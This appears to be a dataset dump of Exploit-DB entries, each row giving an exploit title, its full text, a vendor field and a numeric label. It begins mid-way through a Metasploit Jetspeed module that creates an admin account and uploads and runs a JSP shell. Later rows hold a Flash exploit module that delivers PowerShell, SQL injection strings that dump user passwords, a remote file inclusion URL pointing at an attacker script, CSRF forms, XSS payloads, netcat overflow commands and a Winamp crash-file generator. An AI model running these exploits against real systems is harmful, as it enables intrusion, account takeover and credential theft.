'uri'       => '/jetspeed/services/usermanager/users',       'vars_post' => {         'name'             => username,         'password'         => password,         'password_confirm' => password       }     )     send_request_cgi(       'method'    => 'POST',       'uri'       => ""/jetspeed/services/usermanager/users/#{username}"",       'vars_post' => {         'user_enabled' => 'true',         'roles'        => 'admin'       }     )   end    def kenny_loggins     res = send_request_cgi(       'method' => 'GET',       'uri'    => '/jetspeed/login/redirector'     )      res = send_request_cgi!(       'method'    => 'POST',       'uri'       => '/jetspeed/login/j_security_check',       'cookie'    => res.get_cookies,       'vars_post' => {         'j_username' => username,         'j_password' => password       }     )      @cookie = res.get_cookies   end    # Let's pretend we're mechanize   def import_file     res = send_request_cgi(       'method' => 'GET',       'uri'    => '/jetspeed/portal/Administrative/site.psml',       'cookie' => @cookie     )      html = res.get_html_document     import_export = html.at('//a[*//text() = ""Import/Export""]/@href')      res = send_request_cgi!(       'method' => 'POST',       'uri'    => import_export,       'cookie' => @cookie     )      html = res.get_html_document     html.at('//form[*//text() = ""Import File""]/@action')   end    def upload_payload_zip     zip = Rex::Zip::Archive.new     zip.add_file(""../../webapps/jetspeed/#{jsp_filename}"", payload.encoded)      mime = Rex::MIME::Message.new     mime.add_part(zip.pack, 'application/zip', 'binary',                   %Q{form-data; name=""fileInput""; filename=""#{zip_filename}""})     mime.add_part('on', nil, nil, 'form-data; name=""copyIdsOnImport""')     mime.add_part('Import', nil, nil, 'form-data; name=""uploadFile""')      case target['Platform']     when 'linux'       register_files_for_cleanup(""../webapps/jetspeed/#{jsp_filename}"")       register_files_for_cleanup(""../temp/#{username}/#{zip_filename}"")     when 'win'       register_files_for_cleanup(""..\\webapps\\jetspeed\\#{jsp_filename}"")       register_files_for_cleanup(""..\\temp\\#{username}\\#{zip_filename}"")     end      send_request_cgi(       'method' => 'POST',       'uri'    => import_file,       'ctype'  => ""multipart/form-data; boundary=#{mime.bound}"",       'cookie' => @cookie,       'data'   => mime.to_s     )   end    def exec_jsp_shell     send_request_cgi(       'method' => 'GET',       'uri'    => ""/jetspeed/#{jsp_filename}"",       'cookie' => @cookie     )   end    #   # Cleanup methods   #    def delete_user     send_request_cgi(       'method' => 'DELETE',       'uri'    => ""/jetspeed/services/usermanager/users/#{username}""     )   end    # XXX: This is a hack because FileDropper doesn't delete directories   def on_new_session(session)     super     case target['Platform']     when 'linux'       print_status(""Deleting user temp directory: ../temp/#{username}"")       session.shell_command_token(""rm -rf ../temp/#{username}"")     when 'win'       print_status(""Deleting user temp directory: ..\\temp\\#{username}"")       session.shell_command_token(""rd /s /q ..\\temp\\#{username}"")     end   end    #   # Utility methods   #    def username     @username ||= Rex::Text.rand_text_alpha_lower(8)   end    def password     @password ||= Rex::Text.rand_text_alphanumeric(8)   end    def jsp_filename     @jsp_filename ||= Rex::Text.rand_text_alpha(8) + '.jsp'   end    def zip_filename     @zip_filename ||= Rex::Text.rand_text_alpha(8) + '.zip'   end  end",Apache,1
37360,"GeniXCMS 0.0.3 - Cross-Site Scripting # Exploit Title:  Persistent XSS # Google Dork: intitle: Persistent XSS # Date: 2015-06-21 # Exploit Author:  John Page ( hyp3rlinx ) # Website: hyp3rlinx.altervista.org # Vendor Homepage: genixcms.org # Software Link: genixcms.org # Version: 0.0.3 # Tested on: windows 7 # Category: webapps   Vendor: ============================================= genixcms.org    Product: ===================================================== GeniXCMS v0.0.3 is a PHP based content management system    Advisory Information: =================================================== Multiple persistent & reflected XSS vulnerabilities    Vulnerability Details: ========================================================= GeniXCMS v0.0.3 is vulnerable to persistent and reflected XSS    XSS Exploit code(s): ====================  Persistent XSS: ----------------------- http://localhost/GeniXCMS-master/GeniXCMS-master/gxadmin/index.php?page=posts&act=add&token=  1-content input field content injected XSS will execute after posting is published  2-title input field title injected XSS will execute immediate.   Relected XSS: --------------------- http://localhost/GeniXCMS-master/GeniXCMS-master/gxadmin/index.php?page=posts&q=1'<script>alert('XSS By Hyp3rlinx')</script>    Disclosure Timeline: ========================================================= Vendor Notification: NA June 21, 2015 : Public Disclosure    Severity Level: ========================================================= Med    Description: =========================================================  Request Method(s):         [+] GET & POST    Vulnerable Product:        [+] GeniXCMS 0.0.3    Vulnerable Parameter(s):   [+] q, content & title                          Affected Area(s):          [+] index.php                                                          ===============================================================  [+] Disclaimer Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.   (hyp3rlinx)",metalgenix,1
44910,"MaDDash 2.0.2 - Directory Listing # Exploit Title: MaDDash 2.0.2 - Directory Listing # Date: 2018-06-18 # Vendor: perfSONAR # Download Link: https://github.com/esnet/maddash/archive/master.zip # Version: 2.0.2 # Exploit Author: ManhNho # CVE: CVE-2018-12522,CVE-2018-12523,CVE-2018-12524,CVE-2018-12525 # Category: Webapps # Tested on: Windows 7  --- Description --- A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers. A directory listing provides an attacker with the complete index of all the resources located inside of the directory. The specific risks and consequences vary depending on which files are listed and accessible.  ---Affected items--- http://127.0.0.1/maddash-webui/etc/ http://127.0.0.1/maddash-webui/lib/ http://127.0.0.1/maddash-webui/images/ http://127.0.0.1/maddash-webui/style/  ---References--- https://pastebin.com/eA5tGKf0",MaDDash,0
2203,"Joomla! Component com_jim 1.0.1 - Remote File Inclusion ############################################################ ############################################################ ############# C Y B E R - W A R R I O R  T I M ############# ############################################################ ############################################################  #Mambo jim Component Remote Include Vulnerability  ############################################################  #Author: XORON  ############################################################  #Class: Remote  ############################################################  #cont@ct: x0r0n[at]hotmail[dot]com  ############################################################  #Code:  in install.jim.php , line 16  require_once($mosConfig_absolute_path.""/components/com_jim/readme.txt"");  ############################################################  #Exploit: http://www.site.com/[path]/administrator/components/com_jim/install.jim.php?mosConfig_absolute_path=http://evil_script?  ############################################################  #Greetz: str0ke, Ironfist, Preddy, SHiKaA, sakkkure, x-mastER, DJR, DaRK, EntriKa, R3D4C!D, iNSoMNiA and all my friend  ############################################################  # milw0rm.com [2006-08-17]",.site.,0
30637,"WordPress Plugin Google FeedBurner FeedSmith 2.2 - Cross-Site Request Forgery source: https://www.securityfocus.com/bid/25921/info  FeedBurner FeedSmith is prone to a cross-site request-forgery vulnerability.  Exploiting this issue may allow a remote attacker to use a victim's currently active session to perform actions with the application.  This issue affects FeedBurner FeedSmith 2.2; other versions may also be affected.   // Simple Proof of Concept Exploit for FeedSmith Feedburner CSRF Hijacking // Tested on version 2.2.  t=&#039;http://www.example.com/wordpress/wp-admin/options-general.php?     page=FeedBurner_FeedSmith_Plugin.php&#039;;  p=&#039;redirect=true&feedburner_url=http://www.example2.com/with/new/feed&     feedburner_comments_url=http://www.example3.com/with/new/feed&#039;;  feedburner_csrf = function(t, p) {          req = new XMLHttpRequest();         var url = t;         var params = p;         req.open(""POST"", url);          req.setRequestHeader(""Content-type"", ""application/x-www-form-urlencoded"");         req.setRequestHeader(""Content-length"", params.length);         req.setRequestHeader(""Connection"", ""close"");         req.send(params);  };  feedburner_csrf(t,p);",WordPress,1
18575,"RazorCMS 1.2.1 Stable - Cross-Site Request Forgery (Delete Web Pages) +------------------------------------------------------------------------------------------------------------------------------------+ # Exploit Title : RazorCMS <= 1.2.1 STABLE CSRF (Delete Web Pages) # Date          : 08-03-2012 # Author        : Ivano Binetti (http://www,ivanobinetti.com) # Software link : http://www.razorcms.co.uk/archive/core/razorCMS_core_v1_2_1_STABLE.zip # Vendor site   : http://www.razorcms.co.uk/ # Version       : 1.2.1 STABLE and lower  # Tested on     : Debian Squeeze (6.0)  +------------------------------------------------------------------------------------------------------------------------------------+  Summary 1)Introduction 2)Vulnerabilities Description 3)Exploit (Delete Web Page)     +------------------------------------------------------------------------------------------------------------------------------------+ 1)Introduction ""razorCMS is ideally suited to small to medium website projects, it can be run without need for a database, due to it's flat file structure it has no need for a database meaning it can also be a cost effected method in content management, allowing it to be  used on the cheapest of web hosts, or even free hosting"".  2)Vulnerabilities Description RazorCMS 1.2.1 STABLE (and lower)  is affected by CSRF Vulnerability which allows an attacker to delete web pages, both published  and unpublished.  3)Exploit (Delete Web Page)   <html> <body onload=""javascript:document.forms[0].submit()""> <H2>CSRF Exploit to add ADMIN account</H2> <form method=""POST"" name=""form0"" action=""http://<razorcms_ip>:80/razorcms/admin/?action=showcats&unpub=true&slabID=2&catname=sidebar""> </body> </html>  In this POC I've deleted web page with ID=2    +------------------------------------------------------------------------------------------------------------------------------------+",razorcms,1
32701,"WordPress Plugin XCloner 3.1.0 - Cross-Site Request Forgery Advisory ID: HTB23206 Product: XCloner Wordpress plugin Vendor: XCloner Vulnerable Version(s): 3.1.0 and probably prior Tested Version: 3.1.0 Advisory Publication:  March 12, 2014  [without technical details] Vendor Notification: March 12, 2014  Vendor Patch: March 13, 2014  Public Disclosure: April 2, 2014  Vulnerability Type: Cross-Site Request Forgery [CWE-352] CVE Reference: CVE-2014-2340 Risk Level: Low  CVSSv2 Base Score: 2.6 (AV:N/AC:H/Au:N/C:P/I:N/A:N) Solution Status: Fixed by Vendor Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )   -----------------------------------------------------------------------------------------------  Advisory Details:  High-Tech Bridge Security Research Lab discovered vulnerability in XCloner Wordpress plugin, which can be exploited to perform a CSRF attack and gain access to a backed-up copy of vulnerable website.   Сross-Site Request Forgery (CSRF) in XCloner Wordpress Plugin: CVE-2014-2340  The vulnerability exists due to insufficient verification of HTTP request origin. A remote attacker can trick a logged-in administrator to visit a specially crafted webpage and create a website backup.  Simple exploit code below will create new backup with all website files (no SQL database), which will be publicly accessible on the http://[host]/administrator/backups/backup.tar URL:    <form action=""http://[host]/wp-admin/plugins.php?page=xcloner_show&option=com_cloner&task=confirm"" method=""post"" name=""main""> <input type=""hidden"" name=""dbbackup"" value=""1""> <input type=""hidden"" name=""dbbackup_comp"" value=""""> <input type=""hidden"" name=""bname"" value=""backup""> <input type=""hidden"" name=""backupComments"" value=""""> <input type=""hidden"" name=""option"" value=""com_cloner""> <input type=""hidden"" name=""task"" value=""generate""> <input type=""hidden"" name=""boxchecked"" value=""0""> <input type=""hidden"" name=""hidemainmenu"" value=""0""> <input type=""hidden"" name="""" value=""""> <input type=""submit"" name=""run"" value=""run""> </form> <script> document.main.submit(); </script>   -----------------------------------------------------------------------------------------------  Solution:  Update to XCloner 3.1.1  More Information: http://www.xcloner.com/support/download/?did=9  -----------------------------------------------------------------------------------------------  References:  [1] High-Tech Bridge Advisory HTB23206 - https://www.htbridge.com/advisory/HTB23206 - Сross-Site Request Forgery (CSRF) in XCloner Wordpress Plugin. [2] XCloner Wordpress plugin - http://www.xcloner.com - XCloner is a professional website Backup and Restore application designed to allow you to create safe complete backups of any PHP/Mysql website and to be able to restore them anywhere. It works as a native Joomla backup component, as a native Wordpress backup plugin and also as standalone PHP/Mysql backup application. [3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures. [4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types. [5] ImmuniWeb® - https://portal.htbridge.com/ - is High-Tech Bridge's proprietary web application security assessment solution with SaaS delivery model that combines manual and automated vulnerability testing.  -----------------------------------------------------------------------------------------------  Disclaimer: The information provided in this Advisory is provided ""as is"" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.",.htbridge.,1
6409,"AvailScript Article Script - 'articles.php' Multiple Vulnerabilities ########################################################### #  #        ___    __ __                  __  __             #       /\_ \  /\ \\ \                /\ \/\ \            #   ____\//\ \ \ \ \\ \    __  _ __  _\ \ \ \ \  ____     #  /',__\ \ \ \ \ \ \\ \_ /\ \/'\\ \/'\\ \ \ \ \/\_ ,`\   # /\__, `\ \_\ \_\ \__ ,__\\>  <\\>   <\\ \ \_\ \/_/  /_  # \/\____/ /\____\\/_/\_\_//\_/\_\\_/\_\ \ \_____\/\____\ #  \/___/  \/____/   \/_/  \//\/_///\/_/  \/_____/\/____/ #  #                                 security breakd0wn! ########################################################### #  # Title: Availscript Article Script (articles.php) Multiple Vulnerabilities # Vendor: http://www.availscript.com/ # Vulnerable Version: N/A # Fix: N/A #  ########################################################### #  # c0ntact: sl4x.xuz[at]gmail[dot]com # d0rk: ""assh0le"" # stop lammo #  ###########################################################  ######################   1. Information ######################      Article Script allows you to publish your own articles or from the publishers or authors. Aministrator can go to admin page to edit, delete or manage articles, authors and categories. and the member can post articles as an author or just can read the articles.  ######################   2. Vulnerabilities ######################      SQL Injection in ""articles.php"" in the ""aIDS"" parameter.      Cross Site Scripting in ""articles.php"" in the ""aIDS"" parameter.  ######################   3. PoC ######################      http://localhost/path/articles.php?aIDS=-1+union+select+1,2,user()--      http://localhost/path/articles.php?aIDS=[XSS]  ###########################################################  # milw0rm.com [2008-09-09]",.availscript.,1
5076,"Mambo Component Sermon 0.2 - 'gid' SQL Injection ######################################################################### # # netadvantist@copyright 2006 SQL Injection(com_na_xxx) # ######################################################################### # # AUTHOR : S@BUN # # HOME : http://www.hackturkiye.com # ######################################################################### # # DORKS 1 : allinurl:""com_na_content"" # # DORK 2 : allinurl:""com_na_bible"" # # DORKS 3 : allinurl:""com_na_events"" # # DORKS 4 : allinurl:""com_na_content"" # # DORKS 5 : allinurl:""com_na_feedback"" # # DORKS 6 : allinurl:""com_na_mydocs"" # # DORKS 7 : allinurl:""com_na_churchmap"" # # DORKS 8 : allinurl:""com_na_bibleinfo"" # # DORKS 9 : allinurl:""com_na_dbs"" # # DORKS 10 : allinurl:""com_na_udm"" # # DORKS 11 : allinurl:""com_na_qforms"" # # DORKS 12 : allinurl:""com_na_gallery2"" # # DORKS 13 : allinurl:""com_na_publicrss"" # # DORKS 13 : allinurl:""index.php?kwd"" # ########################################################################## EXPLOÄ°T:  index.php?option=com_sermon&gid=-9999999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(username,0x3a,password),0,0,username,password%2C0%2C0%2C0/**/from/**/mos_users/*   ########################################################################## # S@BUN                      www.hackturkiye.com                     S@BUN ########################################################################## # S@BUN                        i AM NOT HACKER                      S@BUN ##########################################################################  side notes:  	<name>Sermon</name> 	<creationDate>12 JAN 2006</creationDate> 	<author>Isai Michel L.</author> 	<copyright>GNU/GPL</copyright> 	<authorEmail>isai@isaim.com</authorEmail>  	<authorUrl>www.isaim.com</authorUrl> 	<version>0.2</version>  # milw0rm.com [2008-02-07]",.hackturkiye.,1
6905,"SFS EZ Hosting Directory - 'cat_id' SQL Injection ####################################################### # Author : BeyazKurt # Contact : BeyazKurt@BSDMail.Com # Site : www.khg-crew.ws - KOSOVA HACKERS GROUP # LAHEY mahkemesini kiniyoruz. FUCK THE JUSTICE! # # Script : SFS Hosting Directory # Price: $ 24.95 # Script Site: http://scripts-for-sites.com/item.php?item=114 # # D0rk : ""sie go amk. iÅŸinizmi yok xD"" # # SQL Injection Vuln. : # # Exploit : SITE.COM/[path]/directory.php?ax=list&sub=1&cat_id=1+union+select+0,1,version(),database()/* # # Example: http://hostdir.scripts-for-sites.com/directory.php?ax=list&sub=1&cat_id=1+union+select+0,1,version(),database()/* # # ------------------------------- #                       Ya RAMADHAN #              INDEPENDENT KOSOVA (H) - Etnic ALBANIA (H) #  pigs for dedication : WE Are Don't Forget Kosova, Drenica, Srebrenica And All Genocide !! #                      Proud 2 Be ALBANIAN ! # # bÃ¼tÃ¼n emocu,punkci zartci zurtcularin Aq!  Anti-Tikky.Com anti-tikiyiz xD # # ONEMLI Not Expo Bilisimden host almayin. Serefsizler daha sunucu yonetmeyi bilmiyor bide ustune musteriyi keklemeye calisiyo. Yakinda kanitlariyla r10da yayinlicam ;) # Demistim rezil edicem sizi ;) # #######################################################  # milw0rm.com [2008-10-31]",.khg-crew.ws,0
3421,"Macromedia 10.1.4.20 - 'SwDir.dll' Internet Explorer Stack Overflow Denial of Service <pre> <code><span style=""font: 10pt Courier New;""><span class=""general1-symbol"">-----------------------------------------------------------------------------  Macromedia SwDir.dll ver. 10.1.4.20 multiple methods Stack Overflow  author: shinnai  mail: shinnai[at]autistici[dot]org  site: http://shinnai.altervista.org  Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7 -----------------------------------------------------------------------------   <object classid='clsid:233C1507-6A77-46A4-9443-F871F945D258' id='Shockwave' style=""WIDTH: 0px; HEIGHT: 0px"" ></object> <select style=""width: 404px"" name=""Pucca"">   <option value = ""BGCOLOR"">BGCOLOR</option>   <option value = ""SRC"">SRC</option>   <option value = ""AutoStart"">AutoStart</option>   <option value = ""Sound"">Sound</option>   <option value = ""DrawLogo"">DrawLogo</option>   <option value = ""DrawProgress"">DrawProgress</option>   <option value = ""Quoting"">Quoting...</option> </select>    <input language=VBScript onclick=tryMe() type=button value=""Click here to start the test"">  <script language='vbscript'>  Sub tryMe   on error resume next    if Pucca.value=""BGCOLOR"" then      argCount   = 1      arg1=String(1000000, ""A"")      Shockwave.BGCOLOR = arg1       elseif Pucca.value=""SRC"" then      argCount   = 1      arg1=String(1000000, ""A"")      Shockwave.SRC = arg1    elseif Pucca.value = ""AutoStart"" then      argCount = 1      arg1=String(1000000, ""A"")      Shockwave.AutoStart = arg1    elseif Pucca.value = ""Sound"" then      argCount = 1      arg1=String(1000000, ""A"")      Shockwave.Sound = arg1    elseif Pucca.value = ""DrawLogo"" then      argCount = 1      arg1=String(1000000, ""A"")      Shockwave.DrawLogo = arg1    elseif Pucca.value = ""DrawProgress"" then      argCount = 1      arg1=String(1000000, ""A"")      Shockwave.DrawProgress = arg1    else      MsgBox ""Hence to fight and conquer in all your battles is not supreme excellence;"" & vbCrLf & _      ""supreme excellence consists in breaking the enemy's resistance without fighting.""    end if  End Sub </script> </span></span> </code></pre>  # milw0rm.com [2007-03-07]",Macromedia,1
3183,"BBClone 0.31 - 'selectlang.php' Remote File Inclusion ------------------------------------------------------------------------------------------------------------------------ Script:bbclone Affected Version:0.31 Downlaoad:http://sindominio.net/ayuda/bbclone-0.31-esp.zip ------------------------------------------------------------------------------------------------------------------------ Author:Dr Max Virus ------------------------------------------------------------------------------------------------------------------------ Bug in (lib/selectlang.php) Vul Code; require($BBC_LANGUAGE_PATH . $BBC_LANGUAGE . "".php""); ------------------------------------------------------------------------------------------------------------------------ POC: http://[target]/[path]/lib/selectlang.php?BBC_LANGUAGE_PATH=[Bad Code] ------------------------------------------------------------------------------------------------------------------------ Thx:str0ke-koray-Timq-r0ut3r-nuffsaid-All My Friends Special Greetz:AsianEagle-TheMaster-Kacper-Hotturk ------------------------------------------------------------------------------------------------------------------------  # milw0rm.com [2007-01-23]",BBClone,1
19338,"XnView 1.98.8 - '.tiff' Image Processing Heap Overflow (2) #####################################################################################  Application:   XnView TIFF Image Processing Heap Overflow Platforms:   Windows   Secunia:   SA48666      {PRL}:   2012-15  Author:   Francis Provencher (Protek Research Lab's)   Website:   http://www.protekresearchlab.com/  Twitter:   @ProtekResearch   #####################################################################################  1) Introduction 2) Report Timeline 3) Technical details 4) The Code   #####################################################################################  =============== 1) Introduction =============== XnView is a cross-platform image viewer used for viewing, converting, organising and editing graphical & video files. It is free of charge for private, educational and non-profit organisations. For commercial use and distribution, the user must register the program. It is popular with users as it provides features normally found only in commercial image viewers.  (http://en.wikipedia.org/wiki/XnView)  #####################################################################################  ============================ 2) Report Timeline ============================   2012-05-15  Vulnerability reported to Secunia 2012-06-21  Vendor disclose patch   #####################################################################################  ============================ 3) Technical details ============================ Insufficient validation when decompressing SGI32LogLum compressed TIFF images can be exploited to cause a heap-based buffer overflow.   The vulnerabilities are confirmed in version 1.98.8. Other versions may also be affected  #####################################################################################  =========== 4) The Code ===========  http://protekresearchlab.com/exploits/PRL-2012-15.tif https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/19338.tif",xnview,1
36962,"Adobe Flash Player - NetConnection Type Confusion (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = NormalRanking    include Msf::Exploit::Powershell   include Msf::Exploit::Remote::BrowserExploitServer    def initialize(info={})     super(update_info(info,       'Name'                => 'Adobe Flash Player NetConnection Type Confusion',       'Description'         => %q{         This module exploits a type confusion vulnerability in the NetConnection class on         Adobe Flash Player. When using a correct memory layout this vulnerability allows         to corrupt arbitrary memory. It can be used to overwrite dangerous objects, like         vectors, and finally accomplish remote code execution. This module has been tested         successfully on Windows 7 SP1 (32-bit), IE 8 and IE11 with Flash 16.0.0.305.       },       'License'             => MSF_LICENSE,       'Author'              =>         [           'Natalie Silvanovich', # Vulnerability discovery and Google Project Zero Exploit           'Unknown', # Exploit in the wild           'juan vazquez' # msf module         ],       'References'          =>         [           ['CVE', '2015-0336'],           ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsb15-05.html'],           ['URL', 'http://googleprojectzero.blogspot.com/2015/04/a-tale-of-two-exploits.html'],           ['URL', 'http://malware.dontneedcoffee.com/2015/03/cve-2015-0336-flash-up-to-1600305-and.html'],           ['URL', 'https://www.fireeye.com/blog/threat-research/2015/03/cve-2015-0336_nuclea.html'],           ['URL', 'https://blog.malwarebytes.org/exploits-2/2015/03/nuclear-ek-leverages-recently-patched-flash-vulnerability/']         ],       'Payload'             =>         {           'DisableNops' => true         },       'Platform'            => 'win',       'BrowserRequirements' =>         {           :source  => /script|headers/i,           :os_name => OperatingSystems::Match::WINDOWS_7,           :ua_name => Msf::HttpClients::IE,           :flash   => lambda { |ver| ver =~ /^16\./ && Gem::Version.new(ver) <= Gem::Version.new('16.0.0.305') },           :arch    => ARCH_X86         },       'Targets'             =>         [           [ 'Automatic', {} ]         ],       'Privileged'          => false,       'DisclosureDate'      => 'Mar 12 2015',       'DefaultTarget'       => 0))   end    def exploit     @swf = create_swf     @trigger = create_trigger     super   end    def on_request_exploit(cli, request, target_info)     print_status(""Request: #{request.uri}"")      if request.uri =~ /\.swf$/       print_status('Sending SWF...')       send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache'})       return     end      print_status('Sending HTML...')     send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})   end    def exploit_template(cli, target_info)     swf_random = ""#{rand_text_alpha(4 + rand(3))}.swf""     target_payload = get_payload(cli, target_info)     psh_payload = cmd_psh_payload(target_payload, 'x86', {remove_comspec: true})     b64_payload = Rex::Text.encode_base64(psh_payload)      trigger_hex_stream = @trigger.unpack('H*')[0]      html_template = %Q|<html>     <body>     <object classid=""clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"" codebase=""http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab"" width=""1"" height=""1"" />     <param name=""movie"" value=""<%=swf_random%>"" />     <param name=""allowScriptAccess"" value=""always"" />     <param name=""FlashVars"" value=""sh=<%=b64_payload%>&tr=<%=trigger_hex_stream%>"" />     <param name=""Play"" value=""true"" />     <embed type=""application/x-shockwave-flash"" width=""1"" height=""1"" src=""<%=swf_random%>"" allowScriptAccess=""always"" FlashVars=""sh=<%=b64_payload%>&tr=<%=trigger_hex_stream%>"" Play=""true""/>     </object>     </body>     </html>     |      return html_template, binding()   end    def create_swf     path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-0336', 'msf.swf')     swf =  ::File.open(path, 'rb') { |f| swf = f.read }      swf   end    def create_trigger     path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-0336', 'trigger.swf')     swf =  ::File.open(path, 'rb') { |f| swf = f.read }      swf   end end",Adobe,1
5229,"asg-sentry 7.0.0 - Multiple Vulnerabilities #######################################################################                               Luigi Auriemma  Application:  ASG-Sentry               http://www.asg-sentry.com Versions:     <= 7.0.0 Platforms:    Windows and Unix Bugs:         A] arbitrary files deleting               B] heap-overflow in FxAgent               C] termination of FxIAList               D] buffer-overflow in FxIAList Exploitation: remote Date:         10 Mar 2008 Author:       Luigi Auriemma               e-mail: aluigi@autistici.org               web:    aluigi.org   #######################################################################   1) Introduction 2) Bugs 3) The Code 4) Fix   #######################################################################  =============== 1) Introduction ===============   >From vendor's website: ""The ASG-Sentry family of products is a suite of tools strategically engineered to control, monitor, manage, and enhance your network. Sentry's tools provide you with full visibility to your network from any Web browser. Sentry also allows you to fully instrument your company's applications, CPUs, disk space, memory, files, Windows and UNIX platforms, and more.""   #######################################################################  ======= 2) Bugs =======  --------------------------- A] arbitrary files deleting ---------------------------  The fcheck.exe (File Check Utility) CGI available in ASG is used for handling some index files which contain a list of filenames and checksums.  The -b option of this utility allows the creation of these index files and is possible to specify both the name of the output file and, optionally, the folder which will be scanned recursively for finding and reading the various files to add to the list.  The first vulnerability is in the possibility for an external attacker to use this CGI for overwriting existent files with no data (specifying a new folder which will be created by the same program) or with the list of filenames described before. Naturally is possible to specify both files on the local disks or on network shares.  The second effect instead is the possibility of occupying CPU and disk for the scanning of any file in the disk simply specyfing, for example, c:\ as folder.   --------------------------- B] heap-overflow in FxAgent ---------------------------  The FxAgent process running on UDP port 6161 is used for handling the various SNMP requests. A community field longer than 64 bytes can be used by an attacker to exploit a heap-overflow.   -------------------------- C] termination of FxIAList --------------------------  FxIAList is a service which runs on the TCP port 6162 and is used for the logging operations which include the commands ""exit"", ""trace on"" ""verbose"", ""trace off"" and the name of the log file to create (xxxx.xx.xx) and its content. The main problem is that the server doesn't require authentication so anyone can send the ""exit"" command and the service will just terminate.   ------------------------------ D] buffer-overflow in FxIAList ------------------------------  The same service described before is affected also by a stack based buffer-overflow which happens during the copying of the data we want to write to the log file (max 1023 bytes) in a buffer of only 500.   #######################################################################  =========== 3) The Code ===========   http://aluigi.org/poc/asgulo.zip https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5229.zip (2008-asgulo.zip)  A]   http://SERVER:6161/snmx-cgi/fcheck.exe?-b+..\../..\boot.ini   http://SERVER:6161/snmx-cgi/fcheck.exe?-b+c:\windows\win.ini   http://SERVER:6161/snmx-cgi/fcheck.exe?-b+c:\file.txt+c:\   http://SERVER:6161/snmx-cgi/fcheck.exe?-b+\host\document.txt     this link for the network share is correct because Apache converts     any backslash to double so that one becomes \\host\\document.txt  B]   nc SERVER 6161 -v -v -u < asgulo_fxagent.txt  C]   nc SERVER 6162 -v -v -w 1 < asgulo-ialist1.txt  D]   nc SERVER 6162 -v -v -w 1 < asgulo-ialist2.txt   #######################################################################  ====== 4) Fix ======   No fix   #######################################################################  # milw0rm.com [2008-03-10]",.asg-sentry.,1
1935,"Winamp 5.21 - '.Midi' File Header Handling Buffer Overflow (PoC) /*    * ********************************************** *  * Winamp 5.21 - Midi Buffer Overflow in_midi.dll *  * ********************************************** *  * PoC coded by: BassReFLeX                       *  * Date: 19 Jun 2006                              *  * ********************************************** *   */  #include <stdio.h> #include <stdlib.h> #include <string.h>  void usage(char* file);  char header[] = ""\x4D\x54\x68\x64\x00\x00""                 ""\x00\x06\x00\x00\x00\x01""                 ""\x00\x60\x4D\x54\x72\x6B""                 ""\x00\x00"";  char badc0de[] = ""\xFF\xFF\xFF\xFF\xFF\xFF"" 		 ""\xFF\xFF\xFF\xFF\xFF\xFF""; 				 				  				  int main(int argc,char* argv[]) {     system(""cls"");     printf(""\n* ********************************************** *"");     printf(""\n* Winamp 5.21 - Midi Buffer Overflow in_midi.dll *"");     printf(""\n* ********************************************** *"");     printf(""\n* PoC coded by: BassReFLeX                       *"");     printf(""\n* Date: 19 Jun 2006                              *"");     printf(""\n* ********************************************** *"");          if ( argc!=2 )     {         usage(argv[0]);     }          FILE *f;     f = fopen(argv[1],""w"");     if ( !f )     {         printf(""\nFile couldn't open!"");         exit(1);     }                                   printf(""\n\nWriting crafted .mid file..."");     fwrite(header,1,sizeof(header),f);     fwrite(badc0de,1,sizeof(badc0de),f);     printf(""\nFile created successfully!"");     printf(""\nFile: %s"",argv[1]);     return 0; }          void usage(char* file) {     printf(""\n\n"");     printf(""\n%s <Filename>"",file);     printf(""\n\nFilename = .mid crafted file. Example: winsploit.exe craftedsh1t.mid"");     exit(1); }      // milw0rm.com [2006-06-20]",winamp,0
